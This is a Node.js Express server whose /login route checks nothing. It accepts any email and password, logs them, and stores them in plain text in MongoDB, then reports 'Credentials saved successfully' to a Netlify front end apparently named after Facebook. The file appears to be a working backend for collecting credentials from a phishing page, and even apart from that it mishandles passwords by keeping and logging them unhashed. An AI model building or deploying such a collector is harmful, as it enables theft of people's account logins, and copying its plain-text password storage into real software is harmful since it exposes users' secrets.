const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();

// Initialize app
const app = express();
const PORT = process.env.PORT || 3000;
const DataB = process.env.DATAB;  // MongoDB connection URI

// Middleware to parse JSON
app.use(bodyParser.json());

// Enable CORS for a specific origin (your frontend URL)
app.use(cors({ origin: "https://mubsfb.netlify.app" }));

// Connect to MongoDB
mongoose
  .connect(DataB, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("Connected to MongoDB"))
  .catch((error) => console.error("MongoDB connection error:", error));

// Define schema for saving email and password
const userSchema = new mongoose.Schema({
  email: { type: String, required: true }, // Email field (no uniqueness enforced)
  password: { type: String, required: true }, // Password field (plain text)
  createdAt: { type: Date, default: Date.now }, // Timestamp for user creation
});

// Define model based on the schema
const User = mongoose.model("User", userSchema);

// POST route for login (saving email and password in the database)
app.post("/login", async (req, res) => {
  console.log("Login request received:", req.body);

  const { email, password } = req.body;

  // Check if both fields are provided
  if (!email || !password) {
    return res
      .status(400)
      .json({ message: "Email and password are required." });
  }

  // Ensure email is not empty or only spaces
  if (!email.trim()) {
    return res.status(400).json({ message: "Email cannot be empty." });
  }

  // Simple password length validation (optional)
  if (password.length < 6) {
    return res
      .status(400)
      .json({ message: "Password must be at least 6 characters." });
  }

  try {
    // Save the email and password (as plain text) to the database
    const newUser = new User({ email, password });
    await newUser.save();

    return res.status(201).json({ message: "Credentials saved successfully." });
  } catch (error) {
    // Log error and return a 500 status if something goes wrong
    console.error("Error occurred during /login:", error.message);
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: error.message });
  }
});

// Home route for testing server
app.get("/", (req, res) => {
  res.send("Server is running...");
});

// 404 for undefined routes
app.use((req, res) => {
  res.status(404).json({ message: "Route not found" });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
